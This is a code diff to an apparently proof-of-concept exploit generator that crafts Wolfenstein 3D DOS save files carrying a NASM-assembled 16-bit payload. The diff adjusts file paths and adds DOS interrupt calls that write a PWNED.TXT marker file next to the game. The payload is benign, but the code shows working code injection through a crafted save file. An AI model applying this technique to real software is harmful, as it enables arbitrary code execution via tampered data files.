@@ -17,7 +17,8 @@ import tempfile
 from pathlib import Path
 
 HERE = Path(__file__).resolve().parent
-DEFAULT_OUTDIR = HERE / "savegames"
+ROOT = HERE.parent.parent
+DEFAULT_OUTDIR = ROOT / "savegames"
 
 # Save layout (non-SPEAR, 19273-byte saves)
 SZ_HDR = 32
@@ -39,7 +40,7 @@ VERSION_DEFAULTS = {
     "retail": {
         "ext": ".WL6",
         "dgroup_rel": 0x398D,
-        "src": HERE / "wolf3d" / "saves" / "SAVEGAM0.WL6",
+        "src": HERE / "SAVEGAME.WL6",
         "objlist_off": DEFAULT_OBJLIST_OFF,
         "tilemap_off": DEFAULT_TILEMAP_OFF,
     },
@@ -226,6 +227,7 @@ def payload_text(save: bytearray, dgroup: int, args: argparse.Namespace) -> None
     # Escape for NASM db string: keep printable ASCII/simple escapes; fall back to bytes.
     safe = text.encode("latin-1", errors="replace")
     hex_bytes = ",".join(f"0x{b:02X}" for b in safe)
+    msg_len = len(safe)
     asm = f"""bits 16
 org 0x{args.tilemap_off:04X}
 start:
@@ -244,6 +246,19 @@ start:
     int 0x10
     jmp .print
 .done:
+    ; write the message to PWNED.TXT next to the game
+    mov dx, fname
+    xor cx, cx
+    mov ah, 0x3C
+    int 0x21
+    jc .wait
+    mov bx, ax
+    mov dx, msg
+    mov cx, {msg_len}
+    mov ah, 0x40
+    int 0x21
+    mov ah, 0x3E
+    int 0x21
     mov si, nl
 .nl:
     lodsb
@@ -260,6 +275,7 @@ start:
     mov ax, 0x4C00
     int 0x21
 msg: db {hex_bytes}, 0
+fname: db "PWNED.TXT", 0
 nl: db 0x0D, 0x0A, "(press any key to exit)", 0x0D, 0x0A, 0
 """
     payload = assemble_bytes(asm, args.nasm, "text_payload")
